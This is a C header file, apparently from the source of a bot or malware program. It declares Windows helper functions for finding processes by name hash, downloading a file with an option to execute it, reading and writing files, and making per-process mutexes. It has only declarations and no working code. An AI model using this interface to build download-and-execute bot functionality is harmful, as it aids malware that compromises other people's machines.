#pragma once
#include "bot_structs.h"

DWORD WINAPI FindProcessIDByHash(DWORD dwHash);

BOOL WINAPI IsOperatingSystem64Bit();

LPWSTR WINAPI GetWinDir();
DWORD WINAPI GetWinDirEnd(void);

LPWSTR WINAPI GetSystem32Dir();

LPWSTR WINAPI GetFolderPath(DWORD dwCSIDL);

LPVOID WINAPI ReadFileFromDisk(const LPWSTR pwzPath, PDWORD pdwSize);
BOOL WINAPI WriteFileToDisk(LPVOID lpFile, DWORD dwLength, const LPWSTR pwzPath);

DWORD WINAPI GetSerialNumber();

DWORD WINAPI GetRandomNumber();

BOOL WINAPI DownloadFile(const LPSTR pszURL, BOOL bExecute);

BOOL WINAPI StartFileProcess( const LPWSTR pwzPath);

BOOL WINAPI FileExists(const LPWSTR pwzPath);

HANDLE WINAPI CreateMutexOfProcess(DWORD dwProcessID);

DWORD WINAPI GetCountOfThreadsByProcessId(DWORD dwProcessID);

DWORD WINAPI GetProcessIdByHandle(HANDLE hProcess);